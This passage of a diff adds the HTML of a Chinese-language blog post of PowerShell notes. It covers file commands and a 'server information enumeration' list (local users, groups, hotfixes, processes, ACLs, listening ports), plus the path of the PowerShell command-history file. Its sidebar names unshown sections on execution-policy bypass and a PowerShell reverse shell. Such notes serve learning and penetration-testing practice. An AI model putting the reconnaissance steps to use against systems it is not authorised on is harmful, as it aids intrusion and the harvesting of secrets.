class="literal">-Resolve</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#返回所有文件名即</span></span><br><span class="line"><span class="comment">#Pass1.log</span></span><br><span class="line"><span class="comment">#Pass2.log</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Split-Path</span> <span class="literal">-Path</span> <span class="string">"C:\Test\Logs\*.log"</span> </span><br><span class="line"><span class="comment">#返回目录：C:\Test\Logs\</span></span><br><span class="line"></span><br><span class="line">powershell脚本中合并目录，文件</span><br><span class="line"><span class="variable">$</span>目录名= <span class="string">'/root'</span></span><br><span class="line"><span class="variable">$</span>目录名加文件名 = <span class="string">"<span class="variable">$</span>目录名/abc/def.txt"</span></span><br><span class="line"><span class="comment">#返回/root/abc/def.txt</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Content"><a href="#Get-Content" class="headerlink" title="Get-Content"></a>Get-Content</h2><figure class="highlight powershell"><figcaption><span>Get-Content参数 (这里补充get-content的parameters)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><figcaption><span>Get-Content基本用法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> D:\test.txt <span class="comment">#获取test的文件内容</span></span><br><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Content</span> D:\test.txt <span class="literal">-ReadCount</span> <span class="number">0</span> <span class="comment">#将文件分行放到一个数组中</span></span><br><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Content</span> D:\test.txt <span class="literal">-raw</span> <span class="comment">#将一个文件作为大字符串，存入一个变量</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Location"><a href="#Get-Location" class="headerlink" title="Get-Location"></a>Get-Location</h2><p>获取当前路径</p>
+<h2 id="Select-Object"><a href="#Select-Object" class="headerlink" title="Select-Object"></a>Select-Object</h2><p>选择指定字段列出信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Mode,Name <span class="comment">#只列出权限位和文件名信息</span></span><br></pre></td></tr></table></figure>
+
+<p>其他的一些参数</p>
+<ul>
+<li>first 开头的第x个对象 （head</li>
+<li>last 结尾的第x个对象（tail</li>
+<li>unique 集合</li>
+<li>skip 跳过x个对象</li>
+</ul>
+<h2 id="Where-Object"><a href="#Where-Object" class="headerlink" title="Where-Object"></a>Where-Object</h2><p>在搜索时匹配指定的字符串（grep?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Service | Where-Object -Property Status -eq Stopped # 匹配状态处于关闭的服务</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="measure"><a href="#measure" class="headerlink" title="measure"></a>measure</h2><p>统计命令，类似于wc</p>
+<figure class="highlight powershell"><figcaption><span>统计系统中已经安装命令的总数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> | measure</span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Counter"><a href="#Get-Counter" class="headerlink" title="Get-Counter"></a>Get-Counter</h2><p>powershell的性能监视器</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Counter</span> <span class="literal">-ListSet</span> * | <span class="built_in">Sort-Object</span> CounterSetName | <span class="built_in">Format-Table</span> CounterSetName <span class="comment">#查看所有性能分类</span></span><br><span class="line">(<span class="built_in">Get-Counter</span> <span class="literal">-ListSet</span> PhysicalDisk).Paths <span class="comment">#查看某一大类下的小类</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Server"><a href="#Get-Server" class="headerlink" title="Get-Server"></a>Get-Server</h2><h2 id="Get-Scheduled"><a href="#Get-Scheduled" class="headerlink" title="Get-Scheduled"></a>Get-Scheduled</h2><h2 id="Invoke-WebRequest"><a href="#Invoke-WebRequest" class="headerlink" title="Invoke-WebRequest"></a>Invoke-WebRequest</h2><p>向web服务器发请求的命令</p>
+<figure class="highlight powershell"><figcaption><span>Invoke-WebRequest参数列表</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="服务器信息枚举"><a href="#服务器信息枚举" class="headerlink" title="服务器信息枚举"></a>服务器信息枚举</h2><h3 id="Get-LocalUser"><a href="#Get-LocalUser" class="headerlink" title="Get-LocalUser"></a>Get-LocalUser</h3><p>获取本机的用户</p>
+<h3 id="Get-LocalGroup"><a href="#Get-LocalGroup" class="headerlink" title="Get-LocalGroup"></a>Get-LocalGroup</h3><p>获取本机组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-LocalGroup | measure # 获取组并统计数量</span><br></pre></td></tr></table></figure>
+
+<h3 id="Get-Hotfix"><a href="#Get-Hotfix" class="headerlink" title="Get-Hotfix"></a>Get-Hotfix</h3><p>获取已经打了什么补丁</p>
+<h3 id="获取进程信息-Get-Process"><a href="#获取进程信息-Get-Process" class="headerlink" title="获取进程信息 Get-Process"></a>获取进程信息 Get-Process</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Process</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取工作排程-Get-ScheduleTask"><a href="#获取工作排程-Get-ScheduleTask" class="headerlink" title="获取工作排程 Get-ScheduleTask"></a>获取工作排程 Get-ScheduleTask</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ScheduleTask</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取指定文件-路径的所有者信息"><a href="#获取指定文件-路径的所有者信息" class="headerlink" title="获取指定文件/路径的所有者信息"></a>获取指定文件/路径的所有者信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h2><h3 id="Get-NetIPAddress"><a href="#Get-NetIPAddress" class="headerlink" title="Get-NetIPAddress"></a>Get-NetIPAddress</h3><p>获取本机IP信息</p>
+<h2 id="Get-NetTCPConnection"><a href="#Get-NetTCPConnection" class="headerlink" title="Get-NetTCPConnection"></a>Get-NetTCPConnection</h2><p>获取已经开启的tcp端口状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GEt-NetTCPConnection | Where-Object -Property State -Match Listen</span><br></pre></td></tr></table></figure>
+
+<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_his</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/06/16/PowerShell%E7%AC%94%E8%AE%B0/" title="PowerShell笔记">http://atsud0.me/2020/06/16/PowerShell笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/PowerShell/" rel="tag"><i class="fa fa-tag"></i> PowerShell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/16/Vulnhub-Kioptrix-2/" rel="prev" title="Vulnhub-Kioptrix-2">
+      <i class="fa fa-chevron-left"></i> Vulnhub-Kioptrix-2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/06/17/Vulnhub-Kioptrix-3/" rel="next" title="Vulnhub-Kioptrix-3">
+      Vulnhub-Kioptrix-3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Powershell"><span class="nav-number">1.</span> <span class="nav-text">Powershell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基本命令"><span class="nav-number"></span> <span class="nav-text">基本命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Help-amp-GetCommand"><span class="nav-number">1.</span> <span class="nav-text">Get-Help&amp;GetCommand</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#powershell大小写"><span class="nav-number">2.</span> <span class="nav-text">powershell大小写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Powershell-执行策略"><span class="nav-number">3.</span> <span class="nav-text">Powershell 执行策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#当执行策略为Restricted（默认策略）时如何绕过"><span class="nav-number">3.1.</span> <span class="nav-text">当执行策略为Restricted（默认策略）时如何绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-powershell-exe-noprofile"><span class="nav-number">3.1.1.</span> <span class="nav-text">1.powershell.exe -noprofile -</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-使用base64编码绕过"><span class="nav-number">3.1.2.</span> <span class="nav-text">2.使用base64编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-读取文件内容然后通过管道符执行"><span class="nav-number">3.1.3.</span> <span class="nav-text">3.读取文件内容然后通过管道符执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-通过网络下载，但是不写入磁盘执行-无文件落地"><span class="nav-number">3.1.4.</span> <span class="nav-text">4.通过网络下载，但是不写入磁盘执行(无文件落地)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-直接用-command参数"><span class="nav-number">3.1.5.</span> <span class="nav-text">5.直接用-command参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-Invoke-Command"><span class="nav-number">3.1.6.</span> <span class="nav-text">6.Invoke-Command</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-iex"><span class="nav-number">3.1.7.</span> <span class="nav-text">7. iex</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-Bypass绕过"><span class="nav-number">3.1.8.</span> <span class="nav-text">8.Bypass绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-Unrestricted"><span class="nav-number">3.1.9.</span> <span class="nav-text">9.Unrestricted</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-Remotesigned"><span class="nav-number">3.1.10.</span> <span class="nav-text">10.Remotesigned</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-临时修改变量"><span class="nav-number">3.1.11.</span> <span class="nav-text">11.临时修改变量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于渗透"><span class="nav-number">4.</span> <span class="nav-text">关于渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#比较重要的命令"><span class="nav-number">4.1.</span> <span class="nav-text">比较重要的命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">4.2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell-反弹shell"><span class="nav-number">4.2.1.</span> <span class="nav-text">powershell 反弹shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于补全"><span class="nav-number">5.</span> <span class="nav-text">关于补全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-ChildItem"><span class="nav-number">6.</span> <span class="nav-text">Get-ChildItem</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件和目录操作"><span class="nav-number">7.</span> <span class="nav-text">文件和目录操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Content"><span class="nav-number">8.</span> <span class="nav-text">Get-Content</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Location"><span class="nav-number">9.</span> <span class="nav-text">Get-Location</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Select-Object"><span class="nav-number">10.</span> <span class="nav-text">Select-Object</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Where-Object"><span class="nav-number">11.</span> <span class="nav-text">Where-Object</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#measure"><span class="nav-number">12.</span> <span class="nav-text">measure</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Counter"><span class="nav-number">13.</span> <span class="nav-text">Get-Counter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Server"><span class="nav-number">14.</span> <span class="nav-text">Get-Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Scheduled"><span class="nav-number">15.</span> <span class="nav-text">Get-Scheduled</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Invoke-WebRequest"><span class="nav-number">16.</span> <span class="nav-text">Invoke-WebRequest</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器信息枚举"><span class="nav-number">17.</span> <span class="nav-text">服务器信息枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-LocalUser"><span class="nav-number">17.1.</span> <span class="nav-text">Get-LocalUser</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-LocalGroup"><span class="nav-number">17.2.</span> <span class="nav-text">Get-LocalGroup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-Hotfix"><span class="nav-number">17.3.</span> <span class="nav-text">Get-Hotfix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取进程信息-Get-Process"><span class="nav-number">17.4.</span> <span class="nav-text">获取进程信息 Get-Process</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取工作排程-Get-ScheduleTask"><span class="nav-number">17.5.</span> <span class="nav-text">获取工作排程 Get-ScheduleTask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取指定文件-路径的所有者信息"><span class="nav-number">17.6.</span> <span class="nav-text">获取指定文件&#x2F;路径的所有者信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络相关"><span class="nav-number">18.</span> <span class="nav-text">网络相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-NetIPAddress"><span class="nav-number">18.1.</span> <span class="nav-text">Get-NetIPAddress</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-NetTCPConnection"><span class="nav-number">19.</span> <span class="nav-text">Get-NetTCPConnection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#历史命令"><span class="nav-number">20.</span> <span class="nav-text">历史命令</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
